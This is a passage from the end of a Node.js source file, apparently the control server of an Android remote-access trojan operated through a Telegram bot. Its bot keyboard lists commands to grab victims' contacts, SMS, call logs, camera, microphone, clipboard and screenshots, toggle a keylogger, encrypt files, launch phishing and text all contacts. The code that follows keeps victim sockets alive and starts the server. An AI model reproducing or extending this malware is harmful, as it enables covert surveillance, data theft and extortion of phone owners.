                                    'keyboard': [["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
});
// 每隔 5000 毫秒（5 秒）向所有连接的客户端发送 "ping" 消息
setInterval(() => {
  io.sockets.sockets.forEach((socket, socketId, _0x1f46f7) => {
    io.to(socketId).emit("ping", {});
  });
}, 5000);
// 每隔 4800000 毫秒（80 分钟）发送 HTTPS GET 请求
setInterval(() => {
  https.get(data.host, response => {}).on("error", error => {});
}, 4800000);
// 监听指定的端口，默认是 3000
server.listen(process.env.PORT || 3000, () => {
  console.log("listening on port 3000");
});